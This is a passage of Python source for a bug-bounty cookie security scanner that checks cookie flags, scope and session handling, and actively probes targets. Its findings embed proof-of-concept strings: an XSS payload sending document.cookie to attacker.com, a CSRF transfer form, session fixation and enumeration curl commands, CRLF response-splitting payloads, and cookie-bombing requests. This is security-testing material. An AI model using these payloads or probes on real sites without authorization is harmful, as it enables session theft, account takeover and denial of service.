"""
Cookie Security Analyzer Agent

Comprehensive cookie security testing agent that identifies vulnerabilities in cookie
configurations and session management. Tests for missing security flags, cookie injection,
session fixation, cookie overflow, domain/path vulnerabilities, and session hijacking vectors.

This agent tests for:
- Missing HttpOnly flag (XSS cookie theft)
- Missing Secure flag (transmission over HTTP)
- SameSite attribute analysis (None, Lax, Strict)
- Cookie prefix validation (__Secure-, __Host-)
- Session cookie lifetime analysis
- Cookie injection vulnerabilities
- Session fixation attacks
- Predictable session IDs
- Cookie overflow/bombing
- Cookie scope issues (Domain/Path)

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import time
import hashlib
import secrets
import string
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field, asdict
from datetime import date, datetime
from urllib.parse import urlparse
from http.cookies import SimpleCookie
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from engine.core.database import BountyHoundDB
from engine.core.db_hooks import DatabaseHooks


class CookieSeverity(Enum):
    """Cookie vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class CookieVulnType(Enum):
    """Types of cookie vulnerabilities."""
    MISSING_SECURE = "COOKIE_MISSING_SECURE"
    MISSING_HTTPONLY = "COOKIE_MISSING_HTTPONLY"
    MISSING_SAMESITE = "COOKIE_MISSING_SAMESITE"
    SAMESITE_NONE_NO_SECURE = "COOKIE_SAMESITE_NONE_NO_SECURE"
    COOKIE_INJECTION = "COOKIE_INJECTION"
    SESSION_FIXATION = "COOKIE_SESSION_FIXATION"
    COOKIE_OVERFLOW = "COOKIE_OVERFLOW"
    COOKIE_BOMBING = "COOKIE_BOMBING"
    COOKIE_SCOPE_DOMAIN = "COOKIE_SCOPE_DOMAIN"
    COOKIE_SCOPE_PATH = "COOKIE_SCOPE_PATH"
    SEQUENTIAL_SESSION_ID = "COOKIE_SEQUENTIAL_SESSION"
    LOW_ENTROPY_SESSION = "COOKIE_LOW_ENTROPY_SESSION"
    TIMESTAMP_SESSION = "COOKIE_TIMESTAMP_SESSION"
    INVALID_PREFIX = "COOKIE_INVALID_PREFIX"
    LONG_LIFETIME = "COOKIE_LONG_LIFETIME"


@dataclass
class CookieFinding:
    """Represents a cookie security finding."""
    title: str
    severity: CookieSeverity
    vuln_type: CookieVulnType
    description: str
    cookie_name: str
    endpoint: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    poc: str = ""
    impact: str = ""
    remediation: str = ""
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class CookieInfo:
    """Information about a collected cookie."""
    name: str
    value: str
    domain: Optional[str] = None
    path: Optional[str] = "/"
    secure: bool = False
    httponly: bool = False
    samesite: Optional[str] = None
    max_age: Optional[int] = None
    expires: Optional[str] = None
    endpoint: str = ""

    def is_session_cookie(self) -> bool:
        """Check if this is likely a session/auth cookie based on heuristics."""
        # Name-based detection
        session_patterns = [
            'session', 'sess', 'sid', 'auth', 'token', 'jwt',
            'access', 'refresh', 'login', 'user', 'account', 'csrf'
        ]

        name_lower = self.name.lower()
        if any(pattern in name_lower for pattern in session_patterns):
            return True

        # Value-based detection (long random strings)
        if len(self.value) > 20 and not self.value.isdigit():
            # Check for hex/base64 patterns
            if re.match(r'^[A-Za-z0-9+/=_-]+$', self.value):
                return True

        return False

    def has_valid_prefix(self) -> Tuple[bool, Optional[str]]:
        """Check if cookie has valid __Secure- or __Host- prefix."""
        if self.name.startswith('__Secure-'):
            # __Secure- requires Secure flag
            if not self.secure:
                return False, '__Secure- prefix requires Secure flag'
            return True, '__Secure- prefix valid'

        if self.name.startswith('__Host-'):
            # __Host- requires Secure, Path=/, and no Domain
            if not self.secure:
                return False, '__Host- prefix requires Secure flag'
            if self.path != '/':
                return False, '__Host- prefix requires Path=/'
            if self.domain:
                return False, '__Host- prefix requires no Domain attribute'
            return True, '__Host- prefix valid'

        return True, None

    def get_lifetime_seconds(self) -> Optional[int]:
        """Get cookie lifetime in seconds."""
        if self.max_age is not None:
            return self.max_age

        # Session cookies (no expiry) return None
        return None


class CookieSecurityAnalyzer:
    """
    Comprehensive Cookie Security Analyzer.

    Performs deep analysis of cookie configurations, session management,
    and cookie-based vulnerabilities.

    Usage:
        analyzer = CookieSecurityAnalyzer(target_url="https://example.com")
        findings = analyzer.run_all_tests()
    """

    def __init__(self, target_url: str, timeout: int = 10,
                 credentials: Optional[Dict[str, str]] = None,
                 verify_ssl: bool = True,
                 db: Optional[BountyHoundDB] = None):
        """
        Initialize Cookie Security Analyzer.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
            credentials: Login credentials for session fixation tests
            verify_ssl: Whether to verify SSL certificates
            db: BountyHoundDB instance for tracking findings
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library required. Install with: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.credentials = credentials or {}
        self.verify_ssl = verify_ssl
        self.db = db or BountyHoundDB()

        # Extract domain
        self.domain = self._extract_domain(target_url)
        self.is_https = target_url.startswith('https://')

        # State
        self.findings: List[CookieFinding] = []
        self.collected_cookies: Dict[str, CookieInfo] = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL."""
        parsed = urlparse(url)
        return parsed.netloc

    def _parse_cookie_header(self, set_cookie_header: str, endpoint: str = "") -> Optional[CookieInfo]:
        """Parse Set-Cookie header into CookieInfo object."""
        try:
            cookie = SimpleCookie()
            cookie.load(set_cookie_header)

            for key, morsel in cookie.items():
                return CookieInfo(
                    name=key,
                    value=morsel.value,
                    domain=morsel.get('domain'),
                    path=morsel.get('path', '/'),
                    secure=bool(morsel.get('secure')),
                    httponly=bool(morsel.get('httponly')),
                    samesite=morsel.get('samesite'),
                    max_age=int(morsel.get('max-age')) if morsel.get('max-age') else None,
                    expires=morsel.get('expires'),
                    endpoint=endpoint
                )
        except Exception:
            return None

        return None

    def collect_cookies(self, endpoints: Optional[List[str]] = None) -> None:
        """
        Collect cookies from specified endpoints.

        Args:
            endpoints: List of endpoint paths to collect from (default: ['/'])
        """
        if endpoints is None:
            endpoints = ['/']

        print(f"[*] Collecting cookies from {len(endpoints)} endpoint(s)")

        for endpoint in endpoints:
            url = f"{self.target_url}{endpoint}"

            try:
                response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)

                # Parse Set-Cookie headers
                for set_cookie in response.headers.get('Set-Cookie', '').split(','):
                    if set_cookie.strip():
                        cookie_info = self._parse_cookie_header(set_cookie.strip(), endpoint)
                        if cookie_info:
                            self.collected_cookies[cookie_info.name] = cookie_info
                            print(f"[+] Collected cookie: {cookie_info.name}")

                # Also check response.cookies
                for cookie in response.cookies:
                    if cookie.name not in self.collected_cookies:
                        cookie_info = CookieInfo(
                            name=cookie.name,
                            value=cookie.value,
                            domain=cookie.domain,
                            path=cookie.path,
                            secure=cookie.secure,
                            httponly=bool(cookie._rest.get('HttpOnly')),
                            samesite=cookie._rest.get('SameSite'),
                            max_age=cookie._rest.get('Max-Age'),
                            expires=cookie.expires,
                            endpoint=endpoint
                        )
                        self.collected_cookies[cookie.name] = cookie_info
                        print(f"[+] Collected cookie: {cookie.name}")

            except Exception as e:
                print(f"[!] Error collecting cookies from {endpoint}: {e}")

    def test_security_flags(self) -> List[CookieFinding]:
        """Test for missing security flags on cookies."""
        findings = []
        print("[*] Testing security flags...")

        for name, cookie in self.collected_cookies.items():
            is_session = cookie.is_session_cookie()

            # Test 1: Missing Secure flag
            if not cookie.secure and self.is_https:
                severity = CookieSeverity.HIGH if is_session else CookieSeverity.MEDIUM

                findings.append(CookieFinding(
                    title=f"Missing Secure Flag on {'Session' if is_session else ''} Cookie",
                    severity=severity,
                    vuln_type=CookieVulnType.MISSING_SECURE,
                    description=(
                        f"Cookie '{name}' is set without the Secure flag on an HTTPS site. "
                        f"This allows the cookie to be transmitted over unencrypted HTTP connections, "
                        f"enabling network sniffing and man-in-the-middle attacks."
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'cookie_value_prefix': cookie.value[:20] + '...' if len(cookie.value) > 20 else cookie.value,
                        'secure_flag': False,
                        'is_session_cookie': is_session,
                        'domain': cookie.domain
                    },
                    poc=f"""# Test cookie transmission over HTTP
curl http://{self.domain}{cookie.endpoint} -H "Cookie: {name}={cookie.value}" -v

# The cookie will be sent over HTTP, exposing it to network sniffing
# Use Wireshark or mitmproxy to capture: Cookie: {name}=...""",
                    impact=(
                        "Attacker can intercept cookie via:\n"
                        "- Network sniffing (Wireshark, tcpdump)\n"
                        "- Man-in-the-middle attacks (mitmproxy, Bettercap)\n"
                        "- HTTP downgrade attacks (sslstrip)\n"
                        "- Public WiFi eavesdropping"
                    ),
                    remediation=f"Set Secure flag: Set-Cookie: {name}=...; Secure; HttpOnly; SameSite=Strict",
                    cwe_id="CWE-614"
                ))

            # Test 2: Missing HttpOnly flag
            if is_session and not cookie.httponly:
                findings.append(CookieFinding(
                    title="Missing HttpOnly Flag on Session Cookie",
                    severity=CookieSeverity.HIGH,
                    vuln_type=CookieVulnType.MISSING_HTTPONLY,
                    description=(
                        f"Session cookie '{name}' is accessible via JavaScript due to missing HttpOnly flag. "
                        f"Any XSS vulnerability can be escalated to steal this session cookie."
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'httponly_flag': False,
                        'is_session_cookie': True
                    },
                    poc=f"""<!-- XSS payload to steal cookie -->
<script>
// Read cookie via JavaScript (only works without HttpOnly)
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Alternative: Use Image tag -->
<img src=x onerror="this.src='https://attacker.com/log?c='+document.cookie">

<!-- Verify HttpOnly missing -->
<script>
console.log(document.cookie); // Will show {name}=... if HttpOnly is missing
</script>""",
                    impact=(
                        "Session hijacking via:\n"
                        "- Reflected XSS attacks\n"
                        "- Stored XSS attacks\n"
                        "- DOM-based XSS\n"
                        "- Malicious browser extensions\n"
                        "- Compromised third-party scripts"
                    ),
                    remediation=f"Set HttpOnly flag: Set-Cookie: {name}=...; HttpOnly; Secure; SameSite=Strict",
                    cwe_id="CWE-1004"
                ))

            # Test 3: Missing SameSite attribute
            if not cookie.samesite:
                severity = CookieSeverity.HIGH if is_session else CookieSeverity.MEDIUM

                findings.append(CookieFinding(
                    title="Missing SameSite Attribute",
                    severity=severity,
                    vuln_type=CookieVulnType.MISSING_SAMESITE,
                    description=(
                        f"Cookie '{name}' has no SameSite attribute, allowing it to be sent in "
                        f"cross-site requests. This enables CSRF attacks and login CSRF."
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'samesite': None,
                        'is_session_cookie': is_session
                    },
                    poc=f"""<!-- CSRF Attack POC (host on attacker.com) -->
<html>
<body>
<h1>You won a prize!</h1>
<form id="csrf" action="{self.target_url}/api/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>
document.getElementById('csrf').submit();
// Browser sends {name} cookie in cross-site POST request
</script>
</body>
</html>

<!-- Verification curl -->
curl '{self.target_url}/api/sensitive' \\
  -H "Cookie: {name}={cookie.value}" \\
  -H "Origin: https://attacker.com" \\
  -X POST""",
                    impact=(
                        "CSRF attacks enabled:\n"
                        "- State-changing operations\n"
                        "- Account takeover via login CSRF\n"
                        "- Payment/transfer actions\n"
                        "- Profile modifications"
                    ),
                    remediation=f"Set SameSite: Set-Cookie: {name}=...; SameSite=Strict (or Lax for some flows)",
                    cwe_id="CWE-352"
                ))

            # Test 4: SameSite=None without Secure
            if cookie.samesite and cookie.samesite.lower() == 'none' and not cookie.secure:
                findings.append(CookieFinding(
                    title="SameSite=None Requires Secure Flag",
                    severity=CookieSeverity.HIGH,
                    vuln_type=CookieVulnType.SAMESITE_NONE_NO_SECURE,
                    description=(
                        f"Cookie '{name}' has SameSite=None but is missing the Secure flag. "
                        f"Modern browsers will reject this cookie."
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'samesite': 'None',
                        'secure': False
                    },
                    poc=f"# Cookie will be rejected by Chrome 80+, Firefox 69+, Safari 13.1+",
                    impact="Cookie rejected by browsers, breaks functionality",
                    remediation=f"Add Secure: Set-Cookie: {name}=...; SameSite=None; Secure",
                    cwe_id="CWE-614"
                ))

            # Test 5: Invalid cookie prefix
            prefix_valid, prefix_msg = cookie.has_valid_prefix()
            if not prefix_valid:
                findings.append(CookieFinding(
                    title="Invalid Cookie Prefix Configuration",
                    severity=CookieSeverity.MEDIUM,
                    vuln_type=CookieVulnType.INVALID_PREFIX,
                    description=(
                        f"Cookie '{name}' uses __Secure- or __Host- prefix but violates requirements: "
                        f"{prefix_msg}"
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'violation': prefix_msg
                    },
                    poc=f"# Cookie prefix requirements:\n# {prefix_msg}",
                    impact="Cookie may be rejected by browsers or have reduced security",
                    remediation=f"Fix prefix requirements: {prefix_msg}",
                    cwe_id="CWE-16"
                ))

            # Test 6: Long lifetime for session cookies
            lifetime = cookie.get_lifetime_seconds()
            if is_session and lifetime and lifetime > 86400:  # > 24 hours
                findings.append(CookieFinding(
                    title="Excessive Session Cookie Lifetime",
                    severity=CookieSeverity.LOW,
                    vuln_type=CookieVulnType.LONG_LIFETIME,
                    description=(
                        f"Session cookie '{name}' has lifetime of {lifetime} seconds "
                        f"({lifetime // 86400} days), increasing attack window."
                    ),
                    cookie_name=name,
                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'lifetime_seconds': lifetime,
                        'lifetime_days': lifetime // 86400
                    },
                    poc=f"# Long-lived session increases theft window",
                    impact="Stolen session remains valid for extended period",
                    remediation=f"Reduce lifetime to < 24 hours or use session cookies (no Max-Age/Expires)",
                    cwe_id="CWE-613"
                ))

        return findings

    def test_cookie_injection(self) -> List[CookieFinding]:
        """Test for cookie injection vulnerabilities."""
        findings = []
        print("[*] Testing cookie injection...")

        # Test endpoints that might reflect input in cookies
        test_params = [
            ('lang', ['en', 'fr']),
            ('theme', ['dark', 'light']),
            ('timezone', ['UTC', 'EST']),
            ('preference', ['compact', 'full']),
        ]

        injection_payloads = [
            'test\r\nSet-Cookie: injected=true',
            'test\nSet-Cookie: malicious=1',
            'test%0d%0aSet-Cookie: evil=yes',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'; injected='true",
        ]

        for param_name, normal_values in test_params:
            for payload in injection_payloads:
                try:
                    url = f"{self.target_url}/"
                    response = self.session.get(
                        url,
                        params={param_name: payload},
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )

                    # Check if payload appears in Set-Cookie
                    set_cookie = response.headers.get('Set-Cookie', '')

                    if payload in set_cookie or payload.replace('%0d%0a', '\r\n') in set_cookie:
                        findings.append(CookieFinding(
                            title="Cookie Injection Vulnerability",
                            severity=CookieSeverity.HIGH,
                            vuln_type=CookieVulnType.COOKIE_INJECTION,
                            description=(
                                f"User input from parameter '{param_name}' is reflected in Set-Cookie "
                                f"headers without proper sanitization. This enables HTTP response splitting "
                                f"and cookie poisoning attacks."
                            ),
                            cookie_name=param_name,
                            endpoint="/",
                            evidence={
                                'parameter': param_name,
                                'payload': payload,
                                'reflected_in': 'Set-Cookie header'
                            },
                            poc=f"""# Inject malicious cookie
curl '{self.target_url}/?{param_name}={payload}' -v

# Response will include injected Set-Cookie header
# Advanced: Response splitting
curl '{self.target_url}/?{param_name}=test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK' -v""",
                            impact=(
                                "Enables:\n"
                                "- HTTP Response Splitting\n"
                                "- Session fixation\n"
                                "- Cookie poisoning\n"
                                "- Cache poisoning\n"
                                "- XSS via cookie values"
                            ),
                            remediation=(
                                "1. Sanitize all user input before setting cookies\n"
                                "2. Reject newline characters (\\r\\n)\n"
                                "3. Use framework cookie functions\n"
                                "4. Validate against whitelist"
                            ),
                            cwe_id="CWE-113"
                        ))
                        break

                except Exception:
                    continue

        return findings

    def test_session_fixation(self) -> List[CookieFinding]:
        """Test for session fixation vulnerabilities."""
        findings = []

        if not self.credentials or 'login_endpoint' not in self.credentials:
            print("[*] Skipping session fixation test (no credentials provided)")
            return findings

        print("[*] Testing session fixation...")

        try:
            # Step 1: Get session before login
            response = self.session.get(self.target_url, timeout=self.timeout, verify=self.verify_ssl)

            session_cookies_before = {}
            for name, cookie in self.collected_cookies.items():
                if cookie.is_session_cookie():
                    session_cookies_before[name] = cookie.value

            if not session_cookies_before:
                print("[*] No session cookies found for fixation test")
                return findings

            # Step 2: Login
            login_url = f"{self.target_url}{self.credentials['login_endpoint']}"
            login_data = {
                'username': self.credentials.get('username', ''),
                'password': self.credentials.get('password', '')
            }

            self.session.post(login_url, data=login_data, timeout=self.timeout, verify=self.verify_ssl)

            # Step 3: Get session after login
            response = self.session.get(self.target_url, timeout=self.timeout, verify=self.verify_ssl)

            # Re-collect cookies
            self.collect_cookies(['/'])

            session_cookies_after = {}
            for name, cookie in self.collected_cookies.items():
                if cookie.is_session_cookie():
                    session_cookies_after[name] = cookie.value

            # Step 4: Compare
            for name, value_before in session_cookies_before.items():
                if name in session_cookies_after:
                    value_after = session_cookies_after[name]

                    if value_before == value_after:
                        # Session not regenerated - CRITICAL
                        findings.append(CookieFinding(
                            title="Session Fixation Vulnerability",
                            severity=CookieSeverity.CRITICAL,
                            vuln_type=CookieVulnType.SESSION_FIXATION,
                            description=(
                                f"Session cookie '{name}' is not regenerated after authentication. "
                                f"This allows session fixation attacks where an attacker sets the "
                                f"victim's session ID before login, then hijacks the authenticated session."
                            ),
                            cookie_name=name,
                            endpoint=self.credentials['login_endpoint'],
                            evidence={
                                'cookie_name': name,
                                'session_before': value_before[:20] + '...',
                                'session_after': value_after[:20] + '...',
                                'regenerated': False
                            },
                            poc=f"""# Session Fixation Attack Steps:

# 1. Attacker gets session ID
curl {self.target_url} -c cookies.txt
SESSION_ID=$(grep {name} cookies.txt | awk '{{print $7}}')

# 2. Attacker sends victim link with fixed session
# Via URL: {self.target_url}?{name}=$SESSION_ID
# Via subdomain/XSS: document.cookie="{name}=$SESSION_ID"

# 3. Victim logs in with attacker's session ID
curl {login_url} \\
  -d "username=victim&password=victimpass" \\
  -b "{name}=$SESSION_ID" \\
  -c victim_session.txt

# 4. Attacker uses same session ID to access victim's account
curl {self.target_url}/account \\
  -b "{name}=$SESSION_ID"
# Returns victim's account data!""",
                            impact=(
                                "Complete account takeover:\n"
                                "- Attacker gains full access to victim's account\n"
                                "- No credentials needed\n"
                                "- Works on any authentication flow\n"
                                "- Bypasses 2FA if session is fixed before login"
                            ),
                            remediation=(
                                "1. Regenerate session ID on authentication:\n"
                                "   - PHP: session_regenerate_id(true)\n"
                                "   - Node.js: req.session.regenerate()\n"
                                "   - Django: request.session.cycle_key()\n"
                                "2. Invalidate old session\n"
                                "3. Reject session IDs from query parameters"
                            ),
                            cwe_id="CWE-384"
                        ))

        except Exception as e:
            print(f"[!] Session fixation test error: {e}")

        return findings

    def test_session_prediction(self) -> List[CookieFinding]:
        """Test for predictable session IDs."""
        findings = []
        print("[*] Testing session ID predictability...")

        # Collect multiple session IDs
        session_ids: List[Tuple[str, str]] = []  # (cookie_name, session_id)

        for i in range(5):
            try:
                temp_session = requests.Session()
                temp_session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })

                response = temp_session.get(
                    self.target_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                for cookie in response.cookies:
                    cookie_info = CookieInfo(
                        name=cookie.name,
                        value=cookie.value,
                        secure=cookie.secure,
                        httponly=bool(cookie._rest.get('HttpOnly'))
                    )

                    if cookie_info.is_session_cookie():
                        session_ids.append((cookie.name, cookie.value))
                        print(f"[*] Collected session {i+1}: {cookie.value[:20]}...")

                time.sleep(0.5)

            except Exception:
                continue

        if len(session_ids) < 3:
            print("[*] Insufficient session IDs for analysis")
            return findings

        # Analyze by cookie name
        by_name: Dict[str, List[str]] = {}
        for name, sid in session_ids:
            if name not in by_name:
                by_name[name] = []
            by_name[name].append(sid)

        for cookie_name, ids in by_name.items():
            if len(ids) < 3:
                continue

            # Test for sequential IDs
            if self._is_sequential(ids):
                findings.append(CookieFinding(
                    title="Sequential Session IDs Detected",
                    severity=CookieSeverity.CRITICAL,
                    vuln_type=CookieVulnType.SEQUENTIAL_SESSION_ID,
                    description=(
                        f"Session cookie '{cookie_name}' uses sequential or predictable IDs. "
                        f"This allows attackers to enumerate and hijack active sessions."
                    ),
                    cookie_name=cookie_name,
                    endpoint="/",
                    evidence={
                        'cookie_name': cookie_name,
                        'sample_ids': ids[:3],
                        'pattern': 'Sequential'
                    },
                    poc=f"""# Enumerate active sessions
for i in {{1000..2000}}; do
  curl {self.target_url}/api/user \\
    -H "Cookie: {cookie_name}=$i" \\
    -s -o /dev/null -w "%{{http_code}}\\n"
done | grep -v 401

# Any 200 response indicates valid session""",
                    impact=(
                        "Mass session hijacking:\n"
                        "- Enumerate all active sessions\n"
                        "- Predict future session IDs\n"
                        "- No rate limiting needed\n"
                        "- Compromise thousands of accounts"
                    ),
                    remediation=(
                        "Use cryptographically secure random session IDs:\n"
                        "- Python: secrets.token_urlsafe(32)\n"
                        "- Node.js: crypto.randomBytes(32).toString('hex')\n"
                        "- Minimum 128 bits of entropy"
                    ),
                    cwe_id="CWE-330"
                ))

            # Test for low entropy
            entropy_finding = self._check_entropy(cookie_name, ids)
            if entropy_finding:
                findings.append(entropy_finding)

            # Test for timestamp patterns
            if self._has_timestamp_pattern(ids):
                findings.append(CookieFinding(
                    title="Timestamp-Based Session IDs",
                    severity=CookieSeverity.HIGH,
                    vuln_type=CookieVulnType.TIMESTAMP_SESSION,
                    description=(
                        f"Session cookie '{cookie_name}' appears to contain timestamp components, "
                        f"reducing randomness and enabling time-based prediction attacks."
                    ),
                    cookie_name=cookie_name,
                    endpoint="/",
                    evidence={
                        'cookie_name': cookie_name,
                        'sample_ids': ids[:3]
                    },
                    poc=f"""# Predict sessions created at specific times
# If session = hash(timestamp + secret)
# Brute force timestamp window around target login time""",
                    impact="Reduces search space for session prediction",
                    remediation="Remove all predictable components from session IDs",
                    cwe_id="CWE-330"
                ))

        return findings

    def _is_sequential(self, session_ids: List[str]) -> bool:
        """Check if session IDs are sequential."""
        # Try parsing as integers
        try:
            int_ids = [int(sid) for sid in session_ids]
            diffs = [int_ids[i+1] - int_ids[i] for i in range(len(int_ids)-1)]

            if all(0 < diff < 100 for diff in diffs):
                return True
        except:
            pass

        # Try parsing as hex
        try:
            int_ids = [int(sid, 16) for sid in session_ids]
            diffs = [int_ids[i+1] - int_ids[i] for i in range(len(int_ids)-1)]

            if all(0 < diff < 100 for diff in diffs):
                return True
        except:
            pass

        return False

    def _check_entropy(self, cookie_name: str, session_ids: List[str]) -> Optional[CookieFinding]:
        """Check session ID entropy."""
        avg_length = sum(len(sid) for sid in session_ids) / len(session_ids)
        all_chars = set(''.join(session_ids))

        if avg_length < 16:
            return CookieFinding(
                title="Insufficient Session ID Entropy",
                severity=CookieSeverity.HIGH,
                vuln_type=CookieVulnType.LOW_ENTROPY_SESSION,
                description=(
                    f"Session cookie '{cookie_name}' has insufficient entropy "
                    f"(average length: {avg_length:.1f} characters). This makes "
                    f"brute force attacks feasible."
                ),
                cookie_name=cookie_name,
                endpoint="/",
                evidence={
                    'cookie_name': cookie_name,
                    'average_length': avg_length,
                    'character_set_size': len(all_chars),
                    'estimated_entropy_bits': avg_length * 4  # rough estimate
                },
                poc=f"""# Brute force short session IDs
import itertools
chars = "{''.join(sorted(all_chars))}"
for attempt in itertools.product(chars, repeat={int(avg_length)}):
    session_id = ''.join(attempt)
    # Test session_id

# Recommended: Minimum 128 bits (32 hex or 22 base64 chars)""",
                impact="Session IDs vulnerable to brute force attacks",
                remediation=f"Increase to minimum 128 bits of entropy (32+ characters)",
                cwe_id="CWE-330"
            )

        return None

    def _has_timestamp_pattern(self, session_ids: List[str]) -> bool:
        """Check if session IDs contain timestamp patterns."""
        current_time = int(time.time())

        for sid in session_ids:
            # Check if recent timestamp appears in session ID
            if str(current_time)[:8] in sid:
                return True

        return False

    def test_cookie_overflow(self) -> List[CookieFinding]:
        """Test for cookie overflow vulnerabilities."""
        findings = []
        print("[*] Testing cookie overflow...")

        # Test 1: Single large cookie
        large_value = 'A' * 5000

        try:
            response = self.session.get(
                self.target_url,
                cookies={'overflow_test': large_value},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if response.status_code not in [400, 413, 431]:
                findings.append(CookieFinding(
                    title="Cookie Overflow/Truncation Possible",
                    severity=CookieSeverity.MEDIUM,
                    vuln_type=CookieVulnType.COOKIE_OVERFLOW,
                    description=(
                        f"Server accepts oversized cookies (tested with 5000 bytes). "
                        f"This may lead to data corruption, DoS, or security bypass if "
                        f"cookie data is truncated."
                    ),
                    cookie_name="overflow_test",
                    endpoint="/",
                    evidence={
                        'test_size': 5000,
                        'server_response': response.status_code
                    },
                    poc=f"""# Send oversized cookie
curl {self.target_url} \\
  -H "Cookie: session=$(python3 -c 'print("A"*5000)')" \\
  -v""",
                    impact=(
                        "May cause:\n"
                        "- Session data corruption\n"
                        "- Authentication bypass\n"
                        "- Memory exhaustion\n"
                        "- DoS attacks"
                    ),
                    remediation=(
                        "1. Set maximum cookie size (4KB per cookie)\n"
                        "2. Return 431 for oversized cookies\n"
                        "3. Validate cookie integrity"
                    ),
                    cwe_id="CWE-400"
                ))
        except Exception as e:
            print(f"[!] Cookie overflow test error: {e}")

        # Test 2: Cookie bombing (many cookies)
        cookie_bomb = {f'bomb_{i}': 'X' * 4000 for i in range(50)}

        try:
            response = self.session.get(
                self.target_url,
                cookies=cookie_bomb,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if response.status_code not in [400, 413, 431]:
                findings.append(CookieFinding(
                    title="Cookie Bombing Vulnerability",
                    severity=CookieSeverity.MEDIUM,
                    vuln_type=CookieVulnType.COOKIE_BOMBING,
                    description=(
                        f"Server accepts excessive number of cookies (tested with 50 cookies, "
                        f"200KB total). This enables cookie bombing DoS attacks."
                    ),
                    cookie_name="Multiple Cookies",
                    endpoint="/",
                    evidence={
                        'cookies_sent': 50,
                        'total_size_bytes': 200000,
                        'server_response': response.status_code
                    },
                    poc=f"""# Cookie bombing attack
cookies=""
for i in {{1..50}}; do
  cookies+="bomb_$i=$(python3 -c 'print("X"*4000)'); "
done
curl {self.target_url} -H "Cookie: $cookies" -v""",
                    impact="DoS via memory/storage exhaustion",
                    remediation=(
                        "1. Limit total cookies per request (e.g., 20)\n"
                        "2. Limit total cookie header size (e.g., 8KB)\n"
                        "3. Return 431 Request Header Fields Too Large"
                    ),
                    cwe_id="CWE-400"
                ))
        except Exception as e:
            print(f"[!] Cookie bombing test error: {e}")

        return findings

    def test_cookie_scope(self) -> List[CookieFinding]:
        """Test cookie Domain and Path scope issues."""
        findings = []
        print("[*] Testing cookie scope...")

        for name, cookie in self.collected_cookies.items():
            # Test 1: Overly broad domain
            if cookie.domain and cookie.domain.startswith('.'):
                domain_parts = self.domain.split('.')
                cookie_domain_parts = cookie.domain.lstrip('.').split('.')

                # Check if domain is too broad (affects all subdomains)
                if len(cookie_domain_parts) < len(domain_parts):
                    severity = CookieSeverity.HIGH if cookie.is_session_cookie() else CookieSeverity.MEDIUM

                    findings.append(CookieFinding(
                        title="Overly Broad Cookie Domain Scope",
                        severity=severity,
                        vuln_type=CookieVulnType.COOKIE_SCOPE_DOMAIN,
                        description=(
                            f"Cookie '{name}' has Domain={cookie.domain}, making it accessible "
                            f"to all subdomains. If any subdomain is compromised (XSS, takeover), "
                            f"the cookie can be stolen."
                        ),
                        cookie_name=name,
                        endpoint=cookie.endpoint,
                        evidence={
                            'cookie_name': name,
                            'domain': cookie.domain,
                            'affects_subdomains': True
                        },
                        poc=f"""# If attacker compromises any subdomain (e.g., staging.{self.domain})
# via XSS, subdomain takeover, etc.:
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
// Steals {name} cookie from production domain
</script>""",
                        impact=(
                            "Cookie theft via:\n"
                            "- Subdomain XSS\n"
                            "- Subdomain takeover\n"
                            "- Compromised test/staging environments\n"
                            "- Dangling DNS records"
                        ),
                        remediation=(
                            f"1. Remove leading dot: Domain={cookie.domain.lstrip('.')}\n"
                            "2. Or omit Domain attribute (defaults to current host only)\n"
                            "3. Audit and secure all subdomains"
                        ),
                        cwe_id="CWE-668"
                    ))

            # Test 2: Overly broad path
            if cookie.path == '/' and '/admin' in self.target_url:
                findings.append(CookieFinding(
                    title="Overly Broad Cookie Path Scope",
                    severity=CookieSeverity.MEDIUM,
                    vuln_type=CookieVulnType.COOKIE_SCOPE_PATH,
                    description=(
                        f"Admin cookie '{name}' has Path=/, making it accessible from all paths. "
                        f"XSS on any public page can steal admin cookies."
                    ),
                    cookie_name=name,
